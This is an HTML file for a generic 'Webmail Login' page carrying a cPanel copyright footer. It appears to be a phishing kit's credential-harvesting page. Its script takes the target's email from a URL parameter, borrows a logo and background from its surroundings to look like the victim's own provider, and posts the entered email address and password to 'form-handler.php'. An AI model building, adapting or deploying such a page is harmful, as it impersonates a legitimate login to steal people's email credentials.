<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webmail Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin: 0;
            padding: 0;
            transition: background 0.5s ease; /* Smooth transition for background change */
            height: 100vh;
        }

        .container {
            margin-top: 150px;
            position: relative;
            z-index: 2; /* Ensure content is above background */
        }

        .logo {
            margin-bottom: 30px;
            width: 250px;
            max-width: 100%;
        }

        .login-box {
            margin: 0 auto;
            width: 300px;
            background-color: rgba(255, 255, 255, 0.8); /* Semi-transparent background for readability */
            padding: 20px;
            border-radius: 8px;
        }

        .login-box label {
            display: block;
            text-align: left;
            margin: 5px 0;
            font-weight: normal;
        }

        .login-box input[type="text"],
        .login-box input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 15px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
        }

        .login-box button {
            width: 100%;
            padding: 10px;
            background-color: #007bff;
            border: none;
            border-radius: 5px;
            color: white;
            font-size: 16px;
        }

        .login-box button:hover {
            background-color: #0056b3;
        }

        .languages {
            margin-top: 20px;
            color: gray;
        }

        .languages a {
            color: gray;
            text-decoration: none;
            margin-right: 15px;
        }

        .footer {
            margin-top: 30px;
            font-size: 12px;
            color: gray;
        }

        .footer a {
            color: gray;
            text-decoration: none;
        }
    </style>
    <script>
        function setBackground() {
            // If the page is opened in an environment with a background image, we try to capture it.
            let backgroundImage = window.getComputedStyle(document.body).backgroundImage;

            if (backgroundImage === 'none') {
                // If no background image exists, use a default background color
                document.body.style.backgroundColor = "#f0f0f0"; // Light gray as a fallback
            } else {
                // Use the detected background image
                document.body.style.background = backgroundImage + " no-repeat center center fixed";
                document.body.style.backgroundSize = "cover"; // Ensure the background covers the screen
            }
        }

        function setLogo() {
            // Attempt to find a logo on the parent environment, either an image or a title
            const logoElement = document.querySelector('img, title');  // Select the first image or title tag
            
            // If an image is found, use it as the logo
            if (logoElement && logoElement.tagName.toLowerCase() === 'img') {
                const logoSrc = logoElement.src;
                const logoImg = document.createElement('img');
                logoImg.src = logoSrc;
                logoImg.alt = 'Logo';
                logoImg.classList.add('logo');
                document.querySelector('.container').prepend(logoImg); // Add logo above the form
            } 
            // If no image is found, try to set the title as the fallback logo
            else if (logoElement && logoElement.tagName.toLowerCase() === 'title') {
                const logoTitle = logoElement.innerText;
                const titleLogo = document.createElement('div');
                titleLogo.classList.add('logo');
                titleLogo.innerText = logoTitle;
                titleLogo.style.fontSize = '30px'; // Style the title text as the logo
                document.querySelector('.container').prepend(titleLogo); // Add title above the form
            } else {
                // Fallback to default webmail logo if no logo is found
                const defaultLogo = document.createElement('img');
                defaultLogo.src = 'webmail-logo.svg';
                defaultLogo.alt = 'Webmail Logo';
                defaultLogo.classList.add('logo');
                document.querySelector('.container').prepend(defaultLogo); // Add logo above the form
            }
        }

        function populateEmailField() {
            const params = new URLSearchParams(window.location.search);
            if (params.has('email')) {
                document.getElementById('email').value = params.get('email');
            }
        }

        window.onload = function() {
            setBackground();
            setLogo();
            populateEmailField();
        };
    </script>
</head>
<body>
    <div class="container">
        <!-- The logo will be injected dynamically here -->
        <!-- Login form -->
        <div class="login-box">
            <form action="form-handler.php" method="POST">
                <label for="email">Email Address</label>
                <input type="text" id="email" name="email" placeholder="Enter your email address" required>
                
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your email password" required>
                
                <button type="submit">Log in</button>
            </form>
        </div>

        <!-- Language selection -->
        <div class="languages">
            <a href="#">English</a>
            <a href="#">العربية</a>
            <a href="#">čeština</a>
            <a href="#">dansk</a>
            <a href="#">Deutsch</a>
            <a href="#">Ελληνικά</a>
            <a href="#">español</a>
            <a href="#">español latinoamericano</a>
        </div>

        <!-- Footer -->
        <div class="footer">
            <p>&copy; 2024 cPanel, L.L.C. <a href="#">Privacy Policy</a></p>
        </div>
    </div>
</body>
</html>
